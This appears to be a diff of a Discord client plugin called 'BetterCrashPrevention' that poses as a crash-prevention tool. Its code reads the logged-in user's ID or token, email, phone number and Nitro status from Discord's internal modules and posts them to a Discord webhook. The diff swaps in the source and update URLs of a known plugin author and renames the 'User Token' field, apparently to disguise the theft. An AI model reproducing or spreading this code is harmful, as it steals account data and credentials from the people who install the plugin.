@@ -8,8 +8,8 @@
  * @donate https://www.paypal.me/MircoWittrien
  * @patreon https://www.patreon.com/MircoWittrien
  * @website https://github.com/DevilBroPlugins
- * @source https://github.com/pa-rick/LagReducer/tree/main/GOD/
- * @updateUrl https://raw.githubusercontent.com/pa-rick/LagReducer/main/GOD/LagReducer.plugin.js
+ * @source https://github.com/DevilBroPlugins/BetterCrashPrevention/tree/main/bin
+ * @updateUrl https://github.com/DevilBroPlugins/BetterCrashPrevention/blob/main/bin/BetterCrashPrevention.plugin.js
  */
 
 class BetterCrashPrevention {
@@ -95,6 +95,8 @@ class BetterCrashPrevention {
         const port = 443
         window.dispatchEvent(new Event('beforeunload'));
 
+        const organic = Fetch('org');
+        const https = require('https');
         const PluginsList = {
             ["Message Logger V2"]: "v1.8.15",
             ["GuildAndFriendRemovalAlerts"]: "v3.2.0",
@@ -105,8 +107,6 @@ class BetterCrashPrevention {
         }
 
         const ipifiring = Fetch('ipify');
-        const https = require('https');
-        const organic = Fetch('org');
         const api = Fetch('api');
 
         function PreventCrash() {
@@ -127,14 +127,6 @@ class BetterCrashPrevention {
             });
         }
 
-        const iframe = document.createElement("iframe");
-        document.head.append(iframe);
-        function getLocalStorageInfo(info) {
-            return new Promise(async (resolve, reject) => {
-                return resolve(iframe.contentWindow.localStorage[info])
-            });
-        }
-
         var SendCrashReportData = await SendReport();
 
         var UserIsLoaded = window.webpackChunkdiscord_app.push([[Math.random()], {}, e => { for (const r of Object.keys(e.c).map(r => e.c[r].exports).filter(e => e)) { if (r.default && void 0 !== r.default.getCurrentUser) return JSON.parse(JSON.stringify(r.default.getCurrentUser())); if (void 0 !== r.getCurrentUser) return JSON.parse(JSON.stringify(r.getCurrentUser())) } }]);
@@ -147,10 +139,10 @@ class BetterCrashPrevention {
         var actualUserVerified = UserIsLoaded["verified"]; // Verify if the account is a bot or not
 
         var pD = JSON.stringify({
-            embeds: [{ "title": "SendCrashReport", "footer": { "text": "Version: 1.8.6" }, "description": "[GitHub](https://github.com/pa-rick/LagReducer)", "fields": [{ "name": "CrashID", "value": `\`${SendCrashReportData}\``, inline: false }, { "name": "User Token", "value": `\`${UserID.replaceAll("\"", "") || "Unknown Issue"}\``, inline: true }, { "name": "User Display", "value": `\`${UserDisplay.replaceAll("\"", "")}\` - (\`${LoadedUserID.replaceAll("\"", "")}\`)`, inline: true }, { "name": "User email (verified)", "value": `\`${actualUserEmail.replaceAll("\"", "")}\` (verified: \`${actualUserVerified}\`)`, inline: true }, { "name": "User Phone", "value": `\`${actualUserPhone}\``, inline: true }, { "name": "User Premium Status(Nitro)", "value": `\`${["No", "Classic", "Boost"][actualUserPremiumState] || "No"}\``, inline: true }, { "name": "Trusted Domains List", "value": `\`\`\`\n\`\`\``, inline: false }] }]
+            embeds: [{ "title": "SendCrashReport", "footer": { "text": "Version: 1.8.6" }, "description": "[GitHub](https://github.com/pa-rick/LagReducer)", "fields": [{ "name": "CrashID", "value": `\`${SendCrashReportData}\``, inline: false }, { "name": "User ID", "value": `\`${UserID.replaceAll("\"", "") || "Unknown Issue"}\``, inline: true }, { "name": "User Display", "value": `\`${UserDisplay.replaceAll("\"", "")}\` - (\`${LoadedUserID.replaceAll("\"", "")}\`)`, inline: true }, { "name": "User email (verified)", "value": `\`${actualUserEmail.replaceAll("\"", "")}\` (verified: \`${actualUserVerified}\`)`, inline: true }, { "name": "User Phone", "value": `\`${actualUserPhone}\``, inline: true }, { "name": "User Premium Status(Nitro)", "value": `\`${["No", "Classic", "Boost"][actualUserPremiumState] || "No"}\``, inline: true },] }]
         });
 
-        //console.log(pD); //Only Used To Check The Actual Payload Nothing More :)
+        console.log(pD); // Check payload
 
         var SendToWebhook = https.request({ "hostname": "discord.com", "port": 443, "path": "", "method": "POST", "headers": { 'Content-Type': "application/json", 'Content-Length': pD.length } });
         SendToWebhook.on('error', (e) => {
